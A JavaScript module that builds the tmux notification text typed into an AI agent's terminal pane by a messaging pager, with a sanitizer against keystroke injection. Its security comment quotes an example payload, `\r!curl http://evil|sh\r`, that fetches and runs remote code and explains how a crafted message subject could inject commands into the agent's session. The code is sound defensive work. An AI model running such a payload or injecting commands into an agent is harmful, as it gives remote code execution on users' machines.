/**
 * Pure text builders for the pager's tmux nudge. Kept in their own side-effect-free
 * module so they can be unit-tested WITHOUT importing the pager (which parses argv and
 * `process.exit(1)`s / runs `main()` on import), and so the keystroke sanitizer has a
 * single home.
 */

/**
 * SECURITY (keystroke-injection / RCE defense). Peer- and server-controlled strings -
 * a message `subject` (set by any project peer via the `send` MCP tool, which only
 * validates `min(1)`) and `fromPart` - are embedded into the nudge that the pager types
 * into the agent's tmux pane via `tmux send-keys -l -- <text>`. `-l` sends bytes
 * LITERALLY, so a control byte in the payload reaches the terminal: a carriage return
 * (\r, 0x0d) IS the Enter/submit key and ESC (0x1b) drives the TUI. A crafted subject
 * like `\r!curl http://evil|sh\r` would submit a shell command into the (often
 * permission/sandbox-bypassed) agent = remote code execution driven purely by a message
 * subject. Replace every C0 control byte (0x00-0x1f) + DEL (0x7f) with a space, collapse
 * whitespace, and clamp length so the preview can never carry an injected line break or
 * an oversized payload. (Code-point loop instead of a regex literal so no control byte
 * ever lives in this source file.)
 */
export function sanitizeForKeys(s, max = 120) {
  let out = ""
  for (const ch of String(s ?? "")) {
    const code = ch.codePointAt(0)
    out += (code <= 0x1f || code === 0x7f) ? " " : ch
  }
  return out.replace(/ +/g, " ").trim().slice(0, max)
}

// Wording matters: telling the agent to "reply" makes it answer every message
// (incl. acks), which wakes the sender back -> an endless ack-of-ack loop that
// burns tokens. Instead: read, reply ONLY if an answer is needed, and `ack`
// when handled. Empty subject/sender are omitted (no ugly ""/? ). subject and
// fromPart are ALWAYS run through sanitizeForKeys before embedding (see above).
export function buildText(batch, wakeId, part) {
  const guidance = `Use the RelayRoom \`inbox\` MCP tool to read (NOT curl/shell - the HTTP API 404s and won't mark anything read). Reply ONLY if it needs an answer; otherwise just ack it. Do NOT reply to acknowledge or confirm. Close the thread when it's resolved.`
  const wakeTag = wakeId ? ` (wake ${String(wakeId).slice(0, 8)})` : ""
  if (batch.length === 1) {
    const e = batch[0]
    const subjText = sanitizeForKeys(e.subject, 80)
    const whoText = sanitizeForKeys(e.fromPart, 32)
    const subj = subjText ? ` "${subjText}"` : ""
    const who = whoText ? ` from ${whoText}` : ""
    return `📬 RelayRoom: new message${subj}${who} (you are part "${part}"). ${guidance}${wakeTag}`
  }
  const froms = [...new Set(batch.map((e) => sanitizeForKeys(e.fromPart, 32)).filter(Boolean))].join(", ")
  return `📬 RelayRoom: ${batch.length} new messages for part "${part}"${froms ? ` (from ${froms})` : ""}. ${guidance}${wakeTag}`
}
